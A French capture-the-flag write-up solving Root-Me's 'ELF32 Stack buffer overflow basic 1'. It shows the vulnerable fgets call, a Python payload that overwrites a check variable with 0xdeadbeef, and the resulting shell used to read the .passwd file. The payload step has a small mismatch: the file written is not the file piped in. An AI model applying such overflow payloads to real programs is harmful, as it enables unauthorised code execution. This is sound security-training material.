# ELF32 - Stack buffer overflow basic 1

La page du [challenge](https://www.root-me.org/fr/Challenges/App-Systeme/ELF32-Stack-buffer-overflow-basic-1)

## Analyse

La faille se trouve à ce niveau.
```c
char buf[40];
fgets(buf,45,stdin);
```

On remarque, en mettant de plus en plus de lettres dans notre argument, qu'au bout du 40ème, on commence à écrire dans la variable check.
```
$ python -c 'print "x"*40' > /tmp/args.txt
$ cat /tmp/args.txt | ./ch13
[buf]: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
[check] 0x403000a
You are on the right way !
```

On fait ensuite en sorte d'écrire `0xdeadbeef` dans la variable check. Pour cela on fait bien attention dans l'ordre dans lequel on entre les octets, qui est inversé. De plus, pour garder la main sur le stdin (et pouvoir écrire dans le nouveau shell) on ajoute _-_.
```
$ python -c 'print "x"*40 + "\xef\xbe\xad\xde" ' > /tmp/args.txt
$ cat /tmp/payload.txt - | ./ch13
[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭÞ
[check] 0xdeadbeef
Yeah dude ! You win !

ls -a
.  ..  .passwd  ch13  ch13.c

cat .passwd
```
